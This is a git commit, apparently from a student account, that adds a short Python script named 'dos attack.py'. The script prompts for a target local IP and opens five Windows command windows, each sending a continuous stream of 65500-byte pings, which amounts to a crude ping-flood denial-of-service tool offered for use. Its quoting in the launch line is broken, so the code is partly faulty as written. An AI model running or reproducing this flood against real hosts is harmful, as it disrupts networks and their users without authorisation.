22593c70bcc99506b3ccdae8efedb67b6ee577ad
xcheif <xabi.felix@glc.vic.edu.au>
2025-05-13 12:13:20 +1000

    Add files via upload

---
+++ dos attack.py
@@ -0,0 +1,10 @@
+import os
+import time
+ip = input('enter the target local ip')
+command = 'ping {ip} -t -l 65500'
+cmd = command.replace('{ip}',ip)
+for i in range(5):
+    os.system(f'start cmd /k '{cmd}')
+    time.sleep(0.2)
+    
+    
